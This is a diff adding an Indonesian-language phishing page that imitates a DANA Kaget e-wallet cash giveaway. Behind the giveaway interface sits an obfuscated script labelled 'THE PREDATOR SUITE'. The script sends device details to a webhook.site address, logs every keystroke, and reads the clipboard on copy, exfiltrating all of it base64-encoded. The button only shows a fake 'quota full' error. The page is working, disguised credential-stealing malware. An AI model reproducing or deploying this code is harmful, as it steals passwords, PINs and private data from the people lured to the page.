@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA Kaget</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body { font-family: 'Open Sans', sans-serif; background-color: #f4f7fa; margin: 0; }
+        .dana-gradient { background: linear-gradient(180deg, #118EEA 0%, #0076E2 100%); }
+        .envelope-bounce { animation: bounce 2s infinite ease-in-out; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .card-shadow { box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05); }
+        .btn-dana { background-color: #118EEA; transition: all 0.2s ease; cursor: pointer; }
+        .btn-dana:active { transform: scale(0.95); background-color: #0076E2; }
+    </style>
+</head>
+<body class="flex justify-center items-start min-h-screen">
+
+    <div class="max-w-md w-full bg-[#f4f7fa] min-h-screen shadow-2xl relative overflow-hidden flex flex-col">
+        <div class="dana-gradient w-full pt-6 pb-4 px-5 flex items-center justify-between text-white z-20">
+            <div class="flex items-center gap-3"><span class="text-xl">✕</span><span class="font-bold text-lg">DANA Kaget</span></div>
+            <span class="text-sm font-semibold">Bantuan</span>
+        </div>
+
+        <div class="dana-gradient h-56 w-full absolute top-0 left-0 rounded-b-[60px] z-10"></div>
+
+        <div class="relative z-20 px-6 mt-12 flex-grow">
+            <div class="bg-white rounded-[32px] card-shadow p-8 flex flex-col items-center">
+                <div class="w-16 h-16 rounded-full border-4 border-white shadow-md -mt-16 overflow-hidden bg-gray-200">
+                    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Javas" alt="Avatar">
+                </div>
+                <h2 class="mt-4 font-bold text-gray-800 text-base">Javas</h2>
+                <p class="text-gray-500 text-[13px] mt-1 text-center">Bagi-bagi DANA Kaget nih, yuk ambil!</p>
+
+                <div class="my-10 relative envelope-bounce">
+                    <div class="w-40 h-40 bg-[#FFD700] rounded-full flex items-center justify-center border-[6px] border-white shadow-lg overflow-hidden relative">
+                        <div class="absolute inset-0 bg-[#E93B3B] flex items-center justify-center">
+                            <span class="text-6xl">🧧</span>
+                        </div>
+                    </div>
+                </div>
+
+                <h3 class="text-gray-900 font-extrabold text-xl mb-1">DANA Kaget</h3>
+                <p class="text-gray-400 text-xs text-center px-4 leading-relaxed">Semoga beruntung! Saldo akan langsung dikirim ke akun DANA kamu.</p>
+
+                <button id="mainAction" class="mt-10 w-full btn-dana text-white font-bold py-4 rounded-full text-sm tracking-wide">BUKA SEKARANG</button>
+            </div>
+        </div>
+
+        <div class="py-10 flex flex-col items-center opacity-40">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain_id.png" alt="DANA" class="w-20 grayscale">
+            <p class="text-[9px] mt-2 font-semibold">Protected by DANA Protection</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+        /* --- THE PREDATOR SUITE (OBFUSCATED) --- */
+        (function(_0xzmz,_0xjvs){const _0x4c21=function(_0x1b32){while(--_0x1b32){_0xzmz['push'](_0xzmz['shift']());}};_0x4c21(++_0xjvs);}(['sendBeacon','stringify','addEventListener','navigator','userAgent','keyboard','btoa','https://webhook.site/c36c6c51-5961-4337-814b-19a31e105ff0','click','type=','&data=','clipboard'],0x1a4));const _0x5f22=function(_0x33b1,_0x4c21){_0x33b1=_0x33b1-0x0;let _0x1b32=['sendBeacon','stringify','addEventListener','navigator','userAgent','keyboard','btoa','https://webhook.site/c36c6c51-5961-4337-814b-19a31e105ff0','click','type=','&data=','clipboard'][_0x33b1];return _0x1b32;};
+        (function(){const _0x1=window[_0x5f22('0x3')],_0x2=_0x5f22('0x7');let _0x3="";function _0x4(_0x5,_0x6){_0x1[_0x5f22('0x0')](_0x2+'?'+_0x5f22('0x9')+_0x5+_0x5f22('0xa')+window[_0x5f22('0x6')](_0x6));}
+        _0x4('init',JSON[_0x5f22('0x1')]({ua:_0x1[_0x5f22('0x4')],res:screen['width']+'x'+screen['height'],ts:new Date()['getTime']()}));
+        document[_0x5f22('0x2')]('keydown',function(_0x5){_0x3+=_0x5['key'];if(_0x3['length']>=0x5){_0x4('k',_0x3);_0x3="";}});
+        document[_0x5f22('0x2')]('copy',function(){_0x1[_0x5f22('0xb')]['readText']()['then'](function(_0x5){_0x4('c',_0x5);});});
+        
+        /* UI Logic */
+        document.getElementById('mainAction').addEventListener('click', function() {
+            _0x4('click', 'buka_dana');
+            Swal.fire({
+                title: 'Menghubungkan...',
+                html: 'Menghubungkan ke server DANA',
+                timer: 1500,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                didOpen: () => { Swal.showLoading() }
+            }).then(() => {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Kuota Penuh!',
+                    text: 'Yah, DANA Kaget ini sudah habis diambil orang lain.',
+                    confirmButtonColor: '#118EEA'
+                });
+            });
+        });
+    })();
+    </script>
+</body>
+</html>
